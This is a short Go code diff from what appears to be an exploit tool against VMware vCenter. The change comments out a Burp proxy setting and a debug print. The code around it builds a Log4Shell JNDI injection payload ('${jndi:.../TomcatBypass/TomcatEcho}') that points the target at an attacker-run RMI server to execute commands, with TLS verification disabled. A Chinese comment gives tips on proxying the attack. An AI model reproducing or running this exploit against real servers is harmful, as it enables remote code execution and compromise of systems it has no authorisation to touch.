@@ -133,7 +133,7 @@ func Exec_cmd(url, rmiserver, command string) {
 	client.EnableForceHTTP1()
 	client.EnableInsecureSkipVerify()
 	client.SetTimeout(2 * time.Second)
-	client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
+	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
 	rmi_server := fmt.Sprintf("${jndi:%s/TomcatBypass/TomcatEcho}", host)
 	myheader := map[string]string{
 		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
@@ -184,7 +184,7 @@ func getIpAddr2(url string) string {
 		ipaddr = url
 		port = "443"
 	}
-	fmt.Println(port)
+	// fmt.Println(port)
 	conn, err := net.Dial("tcp", ipaddr+":"+port)
 	if err != nil {
 		fmt.Println(err)
